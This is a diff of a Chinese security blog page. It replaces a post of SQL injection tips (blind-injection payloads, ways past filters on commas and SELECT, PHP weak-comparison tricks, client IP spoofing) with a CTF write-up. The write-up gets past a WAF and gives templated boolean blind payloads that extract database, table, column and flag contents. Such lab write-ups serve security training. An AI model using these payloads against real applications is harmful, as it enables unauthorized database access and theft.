@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Web安全,Mysql,">
+  <meta name="keywords" content="CTF,Web安全,">
 
 
 
@@ -79,18 +79,24 @@
 
 
 
-<meta name="description" content="一些常用指令1.当前数据库的所有表select group_concat(table_name separator &amp;#39;@&amp;#39;) from information_schema.TABLES where TABLE_SCHEMA=database();2.获取表中的所有列的名字select group_concat(column_name separator &amp;#39;@&amp;#39;)">
-<meta name="keywords" content="Web安全,Mysql">
+<meta name="description" content="题目地址：http://www.shiyanbar.com/ctf/2009 拿到题目，先尝试分析，在框内输入1，网页显示you are in...接着在框内输入0，网页显示you are not in... 接着尝试输入0&amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1，网页反馈信息Sql injection detected!，由此可以知道该数据库存在WAF保护，通过burp跑fuzz测">
+<meta name="keywords" content="CTF,Web安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入的总结和小技巧">
-<meta property="og:url" content="http://yoursite.com/2019/07/02/SQL注入的总结和小技巧/index.html">
+<meta property="og:title" content="CTF题目-认真一点">
+<meta property="og:url" content="http://yoursite.com/2019/07/05/CTF题目-认真一点/index.html">
 <meta property="og:site_name" content="Chen&#39;s Bolg">
-<meta property="og:description" content="一些常用指令1.当前数据库的所有表select group_concat(table_name separator &amp;#39;@&amp;#39;) from information_schema.TABLES where TABLE_SCHEMA=database();2.获取表中的所有列的名字select group_concat(column_name separator &amp;#39;@&amp;#39;)">
+<meta property="og:description" content="题目地址：http://www.shiyanbar.com/ctf/2009 拿到题目，先尝试分析，在框内输入1，网页显示you are in...接着在框内输入0，网页显示you are not in... 接着尝试输入0&amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1，网页反馈信息Sql injection detected!，由此可以知道该数据库存在WAF保护，通过burp跑fuzz测">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-29T07:38:47.839Z">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/CTF题目-认真一点/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/CTF题目-认真一点/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/CTF题目-认真一点/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/CTF题目-认真一点/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/CTF题目-认真一点/5.png">
+<meta property="og:updated_time" content="2019-08-29T08:14:53.282Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL注入的总结和小技巧">
-<meta name="twitter:description" content="一些常用指令1.当前数据库的所有表select group_concat(table_name separator &amp;#39;@&amp;#39;) from information_schema.TABLES where TABLE_SCHEMA=database();2.获取表中的所有列的名字select group_concat(column_name separator &amp;#39;@&amp;#39;)">
+<meta name="twitter:title" content="CTF题目-认真一点">
+<meta name="twitter:description" content="题目地址：http://www.shiyanbar.com/ctf/2009 拿到题目，先尝试分析，在框内输入1，网页显示you are in...接着在框内输入0，网页显示you are not in... 接着尝试输入0&amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1，网页反馈信息Sql injection detected!，由此可以知道该数据库存在WAF保护，通过burp跑fuzz测">
+<meta name="twitter:image" content="http://yoursite.com/2019/07/05/CTF题目-认真一点/1.png">
 
 
 
@@ -120,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/07/02/SQL注入的总结和小技巧/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/05/CTF题目-认真一点/">
 
 
 
 
 
-  <title>SQL注入的总结和小技巧 | Chen's Bolg</title>
+  <title>CTF题目-认真一点 | Chen's Bolg</title>
   
 
 
@@ -285,7 +291,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/02/SQL注入的总结和小技巧/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/05/CTF题目-认真一点/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Chen DY">
@@ -302,7 +308,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SQL注入的总结和小技巧</h1>
+          <h1 class="post-title" itemprop="name headline">CTF题目-认真一点</h1>
         
 
         <div class="post-meta">
@@ -314,8 +320,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-02T12:24:01+08:00">
-                2019-07-02
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-05T16:11:39+08:00">
+                2019-07-05
               </time>
             
 
@@ -368,7 +374,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  796字
+                  741字
                 </span>
               
 
@@ -405,23 +411,39 @@
       
 
       
-        <h2 id="一些常用指令"><a href="#一些常用指令" class="headerlink" title="一些常用指令"></a>一些常用指令</h2><p>1.当前数据库的所有表<br><code>select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database();</code><br>2.获取表中的所有列的名字<br><code>select group_concat(column_name separator &#39;@&#39;) from information_schema.columns where table_name=&#39;表名&#39;</code></p>
-<h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h2><p>通常情况下可以使用mid和substring两个函数来进行布尔注入，哪个能用就使用哪个，另外在盲注的情况下可以使用ascii()来逐一判断表名列名等<br><code>(ascii(subtring(database(),1,1))=104</code><br><code>(ascii(mid(database(),1,1))=104</code></p>
-<p>但是WAF屏蔽了逗号的使用，那么两种函数都是用不了了，这时候可以换一种表述方式来进行注入，语句如下所示：<br><code>(ascii(substring(database() from 2))=111)</code><br><code>(mid(database() from 1 for 1))=&#39;a&#39;</code><br><code>(substring(database() from 1 for 1))=&#39;a&#39;</code></p>
-<p>另外如果需要用到if语句，也可以将逻辑换一种表达方式，可以使用<code>case when xxx then xxx else xxx end</code>的逻辑，其具体语法如下所示</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &lt;myColumnSpec&gt; = </span><br><span class="line"><span class="keyword">CASE</span> </span><br><span class="line"><span class="keyword">WHEN</span> &lt;A&gt; <span class="keyword">THEN</span> &lt;somethingA&gt; </span><br><span class="line"><span class="keyword">WHEN</span> &lt;B&gt; <span class="keyword">THEN</span> &lt;somethingB&gt; </span><br><span class="line"><span class="keyword">ELSE</span> &lt;somethingE&gt; </span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>
+        <p>题目地址：<a href="http://www.shiyanbar.com/ctf/2009" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/2009</a></p>
+<p>拿到题目，先尝试分析，在框内输入1，网页显示<code>you are in...</code><br>接着在框内输入0，网页显示<code>you are not in...</code></p>
+<p>接着尝试输入<code>0&#39; or &#39;1&#39;=&#39;1</code>，网页反馈信息<code>Sql injection detected!</code>，由此可以知道该数据库存在WAF保护，通过burp跑fuzz测试，如下图所示：</p>
+<img src="/2019/07/05/CTF题目-认真一点/1.png">
 
-<p>举一个爆数据库名的例子：<br><code>1&#39; and case when (substring((select database()) from 1 for 1)=&#39;w&#39;) then sleep(3) else sleep(0) end and &#39;1&#39;=&#39;1</code></p>
-<h2 id="select屏蔽绕过、"><a href="#select屏蔽绕过、" class="headerlink" title="select屏蔽绕过、"></a>select屏蔽绕过、</h2><p>1,：转换个别字母大小写<br>2：输入SESELECTLECT之类的语句来代替SELECT<br>3：用转义的URL编码来代替SELECT（不知道这么表述对不对，就是%后面跟上16进制的ascii码……）<br>4：用/**/来隔开SELECT中的各个字母</p>
-<h2 id="PHP一些特性（漏洞）"><a href="#PHP一些特性（漏洞）" class="headerlink" title="PHP一些特性（漏洞）"></a>PHP一些特性（漏洞）</h2><p>弱类型比较：在某些情况下，PHP会把类数值数据（如含有数字的字符串等）转换成数值处理，== 运算符就是其中之一。在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。比如: 3 == ‘3ascasd’结果为true。</p>
-<h2 id="以0为开头的MD5值"><a href="#以0为开头的MD5值" class="headerlink" title="以0为开头的MD5值"></a>以0为开头的MD5值</h2><p>只要找到一个字串加密后第一个字符为0即可，这里提供几个：240610708，aabg7XSs，aabC9RqS </p>
-<h2 id="PHP布尔类型"><a href="#PHP布尔类型" class="headerlink" title="PHP布尔类型"></a>PHP布尔类型</h2><p>bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。</p>
-<h2 id="截断问题"><a href="#截断问题" class="headerlink" title="截断问题"></a>截断问题</h2><p>ereg函数漏洞：00截断</p>
-<h2 id="SHA1和MD5函数"><a href="#SHA1和MD5函数" class="headerlink" title="SHA1和MD5函数"></a>SHA1和MD5函数</h2><p>这两个PHP函数因为不能处理数组，所以在传入数组的时候会发生错误，在PHP中会直接返回一个False，因此在比较两者的hash值是否相等时，可以传入两个数组，因为false=false成立</p>
-<h2 id="jother编码"><a href="#jother编码" class="headerlink" title="jother编码"></a>jother编码</h2><p>如果在网页中出现一堆<a href></a>+!的东西就用jother解码</p>
-<p>在console将那堆解码的东西复制过去 按回车即可解码</p>
-<h2 id="设置伪造的IP地址"><a href="#设置伪造的IP地址" class="headerlink" title="设置伪造的IP地址"></a>设置伪造的IP地址</h2><p>在包头添加<code>Client-IP:</code>可以用来伪造当前客户端的IP地址，从而欺骗服务器</p>
-<h2 id="Mysql的用户名和密码"><a href="#Mysql的用户名和密码" class="headerlink" title="Mysql的用户名和密码"></a>Mysql的用户名和密码</h2><p>Mysql中可以直接使用username和password获取当前的用户名和密码（不知道对不对）</p>
+<p>可知可以用的符号是<code>or,=,(,),&#39;,&quot;</code><br>被屏蔽的符号为<code>and,,,substring,union,#,|</code>另外空格添加在字符中间也会被屏蔽</p>
+<p>因此可以看出本体的解题思路是使用布尔盲注。。</p>
+<p>我们首先用%0a代替空格进行注入，命令为<code>id=1&#39;%0aor%0a&#39;1&#39;=&#39;1</code>，结果为<code>you are not in...</code><br>这说明用%0a代替空格的方案是正确的，但是可能or在处理中被删除了，因此用oorr来代替or进行注入，结果显示成功，由此开始布尔注入的过程。</p>
+<p>接下来的过程中，我们用oorr替换or，并且把空格替换成%0a</p>
+<h2 id="获取数据库名称长度和数据库名称"><a href="#获取数据库名称长度和数据库名称" class="headerlink" title="获取数据库名称长度和数据库名称"></a>获取数据库名称长度和数据库名称</h2><p>构造payload获取名称长度：<br><code>0&#39; or (length(database())=%s) or&#39;0</code></p>
+<p>构造获取名称的payload:<br><code>0&#39; or (mid(database() from %s for 1))=&#39;%s&#39; or &#39;0</code></p>
+<p>爆破的结果如下图所示：</p>
+<img src="/2019/07/05/CTF题目-认真一点/2.png">
+
+<p>可知获取到的数据库名称为<code>ctf_sql_bool_blind</code></p>
+<h2 id="获取表名的长度和名称"><a href="#获取表名的长度和名称" class="headerlink" title="获取表名的长度和名称"></a>获取表名的长度和名称</h2><p>构造payload获取长度：<br><code>0&#39; or (length((select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database()))=%s) or&#39;0</code></p>
+<p>获取名称的payload为：<br><code>0&#39; or (mid((select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database())from %s for 1)=&#39;%s&#39;)or &#39;0</code></p>
+<p>爆破结果如下：</p>
+<img src="/2019/07/05/CTF题目-认真一点/3.png">
+
+<p>由上图可知，该数据库下由两张表，分别是fiag和users，因为在最开始没有在group_concat里面加separator ‘@’，所以两个名称都连在一起了，原因是默认的分隔符不知道是什么，所以程序就跳过了分隔符。</p>
+<h2 id="获取字段名称长度和名称"><a href="#获取字段名称长度和名称" class="headerlink" title="获取字段名称长度和名称"></a>获取字段名称长度和名称</h2><p>构造获取长度的payload:<br><code>0&#39; or (length((select group_concat(column_name) from information_schema.columns where TABLE_name=&#39;%s&#39;))=%s) or&#39;0</code></p>
+<p>获取内容的payload:<br><code>0&#39; or (mid((select group_concat(column_name) from information_schema.columns where TABLE_name=&#39;%s&#39;)from %s for 1)=&#39;%s&#39;)or &#39;0</code></p>
+<p>爆破结果如下：</p>
+<img src="/2019/07/05/CTF题目-认真一点/4.png">
+
+<h2 id="获取flag的长度和内容"><a href="#获取flag的长度和内容" class="headerlink" title="获取flag的长度和内容"></a>获取flag的长度和内容</h2><p>获取长度的payload:<br><code>0&#39; or (length((select %s from %s))=%s) or&#39;0</code></p>
+<p>获取内容的payload:<br><code>0&#39; or (mid((select %s from %s)from %s for 1)=&#39;%s&#39;)or &#39;0</code></p>
+<p>爆破结果如下：</p>
+<img src="/2019/07/05/CTF题目-认真一点/5.png">
+
+<p>这里多加了两位长度，因为在提交的时候发现爆破出来的flag一直报错，多加了两位后发现后面无论多少位<code>-</code>都能匹配上，因此认定中间的<code>-</code>可能是另外的符号转化的。</p>
+<p>通过使用ascii()函数来确定该字符的确切ascii码，发现该字符是空格，因为空格已经被屏蔽了，所以用等号来确定是无法确定的。</p>
 
       
     </div>
@@ -439,9 +461,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a>
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
           
-            <a href="/tags/Mysql/" rel="tag"><i class="fa fa-tag"></i> Mysql</a>
+            <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a>
           
         </div>
       
@@ -454,8 +476,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/02/文件包含的简单介绍/" rel="next" title="文件包含的简单介绍">
-                <i class="fa fa-chevron-left"></i> 文件包含的简单介绍
+              <a href="/2019/07/04/CTF题目-加了料的报错注入/" rel="next" title="CTF题目-加了料的报错注入">
+                <i class="fa fa-chevron-left"></i> CTF题目-加了料的报错注入
               </a>
             
           </div>
@@ -464,8 +486,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/07/04/CTF题目-加了料的报错注入/" rel="prev" title="CTF题目-加了料的报错注入">
-                CTF题目-加了料的报错注入 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/07/05/SQLMAP的使用/" rel="prev" title="SQLMAP的使用">
+                SQLMAP的使用 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -600,7 +622,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一些常用指令"><span class="nav-number">1.</span> <span class="nav-text">一些常用指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#布尔注入"><span class="nav-number">2.</span> <span class="nav-text">布尔注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#select屏蔽绕过、"><span class="nav-number">3.</span> <span class="nav-text">select屏蔽绕过、</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP一些特性（漏洞）"><span class="nav-number">4.</span> <span class="nav-text">PHP一些特性（漏洞）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#以0为开头的MD5值"><span class="nav-number">5.</span> <span class="nav-text">以0为开头的MD5值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP布尔类型"><span class="nav-number">6.</span> <span class="nav-text">PHP布尔类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#截断问题"><span class="nav-number">7.</span> <span class="nav-text">截断问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SHA1和MD5函数"><span class="nav-number">8.</span> <span class="nav-text">SHA1和MD5函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jother编码"><span class="nav-number">9.</span> <span class="nav-text">jother编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#设置伪造的IP地址"><span class="nav-number">10.</span> <span class="nav-text">设置伪造的IP地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql的用户名和密码"><span class="nav-number">11.</span> <span class="nav-text">Mysql的用户名和密码</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#获取数据库名称长度和数据库名称"><span class="nav-number">1.</span> <span class="nav-text">获取数据库名称长度和数据库名称</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取表名的长度和名称"><span class="nav-number">2.</span> <span class="nav-text">获取表名的长度和名称</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取字段名称长度和名称"><span class="nav-number">3.</span> <span class="nav-text">获取字段名称长度和名称</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取flag的长度和内容"><span class="nav-number">4.</span> <span class="nav-text">获取flag的长度和内容</span></a></li></ol></div>
             
 
           </div>
